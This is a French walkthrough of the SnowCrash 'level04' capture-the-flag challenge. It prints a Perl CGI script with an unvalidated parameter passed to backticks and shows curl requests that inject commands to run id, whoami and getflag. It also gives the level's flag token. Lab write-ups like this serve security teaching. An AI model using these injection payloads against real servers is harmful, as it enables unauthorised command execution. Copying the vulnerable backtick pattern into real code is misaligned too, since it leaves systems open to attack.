# Level 04

## Étapes pour résoudre le challenge

1. **Identification et copie du fichier :**

   On commence par identifier le fichier `level04.pl` qui est un script Perl. Pour faciliter l'analyse, nous le copions sur notre machine locale.

   ```bash
   scp -P 4242 level04@localhost:~/level04.pl .
   ```

2. **Examen du fichier :**

   Pour avoir une première idée du contenu du fichier, on utilise la commande `cat` :

   ```bash
   cat level04.pl
   ```

   Le contenu du fichier est le suivant :

   ```perl
   #!/usr/bin/perl
   # localhost:4747
   use CGI qw{param};
   print "Content-type: text/html\n\n";
   sub x {
     $y = $_[0];
     print `echo $y 2>&1`;
   }
   x(param("x"));
   ```

   On comprend plusieurs choses :
   - Le script utilise le module CGI pour récupérer des paramètres.
   - Il utilise la fonction `x` pour afficher le contenu de la variable `y`.
   - La variable `y` est récupérée via la fonction `param` du module CGI.

3. **Exploitation de la faille :**

   Le script exécute la commande `echo` avec la variable `y` sans aucune validation. Cela permet une injection de commande. Nous allons exploiter cette faille pour exécuter des commandes arbitraires.

4. **Exécution de commandes via injection :**

   Nous utilisons `curl` pour envoyer des requêtes HTTP avec des commandes injectées. Voici quelques exemples :

   ```bash
   level04@SnowCrash:~$ curl http://localhost:4747/?x="\`/usr/bin/id\`"
   uid=3004(flag04) gid=2004(level04) groups=3004(flag04),1001(flag),2004(level04)

   level04@SnowCrash:~$ curl http://localhost:4747/?x="\`/usr/bin/whoami\`"
   flag04
   ```

   Nous constatons que nous sommes déjà l'utilisateur `flag04`. Nous pouvons donc directement lire le flag.

5. **Obtention du flag :**

   En exécutant la commande suivante, nous obtenons le flag :

   ```bash
   level04@SnowCrash:~$ curl http://localhost:4747/?x="\`/bin/getflag\`"
   Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
   ```

6. **Connexion en tant que level05 :**

   Avec le flag obtenu, nous pouvons nous connecter en tant que `level05` :

   ```bash
   su level05
   ```

## Résumé

Pour résoudre ce challenge, nous avons exploité une vulnérabilité d'injection de commande dans un script Perl CGI. En utilisant des requêtes HTTP avec `curl`, nous avons pu exécuter des commandes arbitraires et obtenir le flag.

Le flag pour `level04` est : `ne2searoevaevoem4ov4ar8ap`.
